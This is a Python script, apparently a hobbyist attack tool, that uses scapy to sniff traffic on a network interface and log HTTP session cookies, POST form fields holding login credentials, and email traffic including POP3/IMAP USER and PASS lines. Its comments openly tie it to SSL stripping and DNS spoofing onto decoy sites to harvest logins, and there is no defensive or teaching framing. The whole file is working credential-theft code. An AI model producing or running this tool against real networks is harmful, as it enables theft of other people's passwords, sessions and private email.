from scapy.all import sniff, Raw
from scapy.layers.inet import IP, TCP
import re
import os
import signal
import multiprocessing
from datetime import datetime

# Create a directory for log files if it doesn't exist
LOG_DIR = "PacketSnifferLogs"
os.makedirs(LOG_DIR, exist_ok=True)

# Log writing utility
def write_log(protocol, data):
    filename = os.path.join(LOG_DIR, f"{protocol}_log.txt")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(filename, 'a') as logfile:
        logfile.write(f"[{timestamp}] {data}\n")

# Packet handler function
def packet_sniffer(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP) and packet.haslayer(Raw):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        payload = packet[Raw].load.decode(errors='ignore')

        # Look for HTTP Cookies
        # Generally we won't get any unless we SSLstrip unguarded websites

        if "HTTP" in payload:
            if "Cookie:" in payload:
                cookies = extract_http_cookies(payload)
                if cookies:
                    write_log("Cookies", f"{src_ip} -> {dst_ip} : {cookies}")

        if 'POST' in payload:
            # Generic search for key=value pairs
            # Can be good to grasp some login key=value pairs
            # Can make sure to get this from decoy website hosting after some DNS spoof
            credentials = re.findall(r'(\w+)=([^&]+)', payload)
            for key, value in credentials:
                write_log("Credentials",f"{key}: {value}")

        # Check for email protocols (SMTP, POP3, IMAP)
        # Also not so much here, but sure, gotta snoop on something
        if is_email_protocol(packet):
            email_data = extract_email_data(payload)
            if email_data:
                write_log("Email", f"{src_ip} -> {dst_ip} : {email_data}")


def extract_http_cookies(payload):
    cookies = []
    lines = payload.split("\r\n")
    for line in lines:
        if line.startswith("Cookie:"):
            cookies.append(line)
    return "\n".join(cookies) if cookies else None

def is_email_protocol(packet):
    """Check if the packet is related to SMTP, POP3, or IMAP"""
    email_ports = {25, 110, 143, 465, 587, 993, 995}
    sport = packet[TCP].sport
    dport = packet[TCP].dport
    return sport in email_ports or dport in email_ports

def extract_email_data(payload):
    """Extract relevant email data"""
    if "MAIL FROM:" in payload or "RCPT TO:" in payload:
        return f"SMTP Data: {payload}"
    elif "USER" in payload or "PASS" in payload:
        return f"POP3/IMAP Credentials: {payload}"
    elif "Subject:" in payload or "From:" in payload or "To:" in payload:
        return f"Email Content: {payload}"
    return None

# Function to start sniffing
def start_sniffing(interface="wlan0"):
    print(f"Starting packet sniffing on interface: {interface}")
    sniff(iface=interface, prn=packet_sniffer, filter="ip", store=False)

# Main function for spawning a sniffing process
def sniffing_process():
    interface = input("Enter the network interface to sniff on (e.g., eth0, wlan0): ")
    sniff_proc = multiprocessing.Process(target=start_sniffing, args=(interface,))
    sniff_proc.start()

    try:
        sniff_proc.join()
    except KeyboardInterrupt:
        print("\nStopping packet sniffing...")
        sniff_proc.terminate()
        sniff_proc.join()

if __name__ == "__main__":
    sniffing_process()